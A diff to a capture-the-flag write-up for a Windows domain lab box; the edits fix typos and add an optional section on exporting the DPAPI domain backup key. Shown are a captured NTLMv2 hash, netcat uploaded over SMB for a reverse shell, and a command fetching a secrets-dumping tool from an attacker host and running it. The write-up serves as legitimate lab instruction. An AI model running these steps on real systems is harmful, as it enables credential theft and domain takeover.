@@ -113,7 +113,10 @@ We got quite a lot of services. Let's start to fingerprint main services:
     |_    Message signing enabled and required
 
 We can notice that SMB is version 3 and that signing is also required, it implies that NTLM realy attack are not possible. We also find the FQDN for the server (fire.windcorp.thm).
-First we can inspect the web site, since some images are not loaded correctly due to the fact that the hostname cannot be resolved, let's add the entry to the file host.
+First we can inspect the web site, since some images are not loaded correctly due to the fact that the hostname cannot be resolved, let's add the entry to attacker hosts file.
+
+    
+
 Navigating the site we can see that the IM client used is [Spark](https://www.igniterealtime.org/projects/spark). Using searchspolit to find some exploits but I found nothing, but searching the web I hit the following vulnerability: [CVE-2020-12772](https://nvd.nist.gov/vuln/detail/CVE-2020-12772), that actually it was discovered during the creation of this box by the authors. The version affected is 2.8.3 (and the ROAR plugin for it) on Windows. Anyway we need a valid user account to try to exploi this vulnerability, so at the moment is unusable. Going on with discovery actvities I tested the search function that actually does nothing, since the form does not perform any action. Indeed the change password form return the following response. Inspecting the workflow in Burp:
 
     -->
@@ -235,7 +238,8 @@ After a while we will get buse's hash:
 
     [HTTP] NTLMv2 Client   : 10.10.9.146
     [HTTP] NTLMv2 Username : WINDCORP\buse
-    [HTTP] NTLMv2 Hash     : buse::WINDCORP:ab702f1448174896:312957EE0E14C19E1AC7C13952DD48ED:........0000000                                                          [*] Skipping previously captured hash for WINDCORP\buse
+    [HTTP] NTLMv2 Hash     : buse::WINDCORP:ab702f1448174896:312957EE0E14C19E1AC7C13952DD48ED:........0000000                                                          
+    [*] Skipping previously captured hash for WINDCORP\buse
 
 Then we can try to reverse the hashed value:
 
@@ -395,7 +399,7 @@ Inspecting the file content:
     cisco.com
 At this point we can chain a malicious command to get a shell. My idea was to upload netcat on the server and execute a reverse shell. So first I uploaded netcat to the server:
 
-    mb: \brittanycr\> put nc64.exe
+    smb: \brittanycr\> put nc64.exe
     putting file nc64.exe as \brittanycr\nc64.exe (105.6 kb/s) (average 105.6 kb/s)
 
 Then I modified the hosts file as follows:
@@ -434,6 +438,25 @@ Then I uploaded the file, wait a minute and get a shell again using buse user:
     ...
 
 So being administrator we can get the last flag in C:\users\administrator\desktop.
+
+## Optional: export DPAPI Domain Backup Key
+### If you want to complite the series, you will need of that key to complete Osiris
+I used the [CQTools suite](https://github.com/BlackDiverX/cqtools/tree/master) to accomplish this task. You can find the explanations on how to use these tools [here](https://github.com/BlackDiverX/cqtools/blob/master/bh-asia-2019_arsenal_whitepaper_paula_januszkiewicz_1.1.pdf).
+Here I used CQLsassSecretsDumper.exe
+    
+    *Evil-WinRM* PS C:\Users\buse\Documents> invoke-webrequest http://10.9.1.97:8000/CQLsassSecretsDumper.exe -outfile CQLSD.exe
+
+And execute it:
+
+    *Evil-WinRM* PS C:\Users\buse\Documents> .\CQLSD.exe /file ra-dpapi-bk.pfx
+    Prefered key: 07ea03b4-3b28-4270-8862-0bc66dacef1a
+Then download the file
+
+    *Evil-WinRM* PS C:\Users\buse\Documents> download ra-dpapi-bk.pfx
+    Info: Downloading C:\Users\buse\Documents\ra-dpapi-bk.pfx to ra-dpapi-bk.pfx
+    Info: Download successful!
+
+Keep the pfx file on your machine, since it will come in handy to solve Osiris!
 
 ## Remove wine and i386 architecture
 Kill all the process related to Spark client
